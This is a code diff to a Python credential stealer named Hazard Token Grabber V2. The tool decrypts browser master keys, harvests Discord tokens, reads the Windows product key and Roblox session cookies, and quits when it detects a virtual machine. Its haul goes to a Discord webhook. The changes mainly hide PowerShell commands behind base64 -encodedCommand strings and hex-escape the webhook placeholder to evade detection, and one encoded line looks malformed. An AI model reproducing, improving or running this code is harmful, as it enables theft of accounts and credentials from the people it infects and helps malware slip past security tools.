@@ -23,7 +23,7 @@ from win32crypt import CryptUnprotectData
 from datetime import datetime, timezone, timedelta
 
 __author__ = "Rdimo"
-__version__ = '1.8.4'
+__version__ = '1.8.6'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -95,9 +95,11 @@ class Functions(object):
             c = f.read()
         local_state = json.loads(c)
 
-        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = Functions.win_decrypt(master_key[5:])
-        return master_key
+        try:
+            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+            return Functions.win_decrypt(master_key[5:])
+        except KeyError:
+            return None
 
     @staticmethod
     def convert_time(time):
@@ -113,7 +115,7 @@ class Functions(object):
         return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]
 
     @staticmethod
-    def create_temp_file(_dir: str | os.PathLike = gettempdir()):
+    def create_temp_file(_dir: str or os.PathLike = gettempdir()):
         file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
         path = ntpath.join(_dir, file_name)
         open(path, "x")
@@ -143,9 +145,9 @@ class Functions(object):
     @staticmethod
     def system_info() -> list:
         flag = 0x08000000
-        sh1 = "wmic csproduct get uuid"
-        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
-        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
+        sh1 = "powershell -encodedCommand dwBtAGkAYwAgAGMAcwBwAHIAbwBkAHUAYwB0ACAAZwBlAHQAIAB1AHUAaQBkAA=="
+        sh2 = "powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABTAG8AZgB0AHcAYQByAGUAUAByAG8AdABlAGMAdABpAG8AbgBQAGwAYQB0AGYAbwByAG0AJwAgAC0ATgBhAG0AZQAgAEIAYQBjAGsAdQBwAFAAcgBvAGQAdQBjAHQASwBlAHkARABlAGYAYQB1AGwAdAA=' -Name BackupProductKeyDefault"
+        sh3 = "powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AJwAgAC0ATgBhAG0AZQAgAFAAcgBvAGQAdQBjAHQATgBhAG0AZQA="
         try:
             HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
         except Exception:
@@ -227,7 +229,7 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
-        if self.webhook == "" or self.webhook == "WEBHOOK_HERE":
+        if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
             os._exit(0)
         if self.fetch_conf('anti_debug') and AntiDebug().inVM:
             os._exit(0)
@@ -272,7 +274,7 @@ class HazardTokenGrabberV2(Functions):
             if 'discord' in _dir.lower():
                 discord = self.appdata + os.sep + _dir
                 for __dir in os.listdir(ntpath.abspath(discord)):
-                    if re.match(r'app-(\d*\.\d*)*', __dir):
+                    if re.match(r'app.+', __dir):
                         app = ntpath.abspath(ntpath.join(discord, __dir))
                         modules = ntpath.join(app, 'modules')
                         if not ntpath.exists(modules):
@@ -551,7 +553,7 @@ class HazardTokenGrabberV2(Functions):
         def subproc(path):
             try:
                 return subprocess.check_output(
-                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
+                    fr"powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAB7AHAAYQB0AGgAfQA6AFMATwBGAFQAVwBBAFIARQBcAFIAbwBiAGwAbwB4AFwAUgBvAGIAbABvAHgAUwB0AHUAZABpAG8AQgByAG8AdwBzAGUAcgBcAHIAbwBiAGwAbwB4AC4AYwBvAG0AIAAtAE4AYQBtAGUAIAAuAFIATwBCAEwATwBTAEUAQwBVAFIASQBUAFkA",
                     creationflags=0x08000000).decode().rstrip()
             except Exception:
                 return None
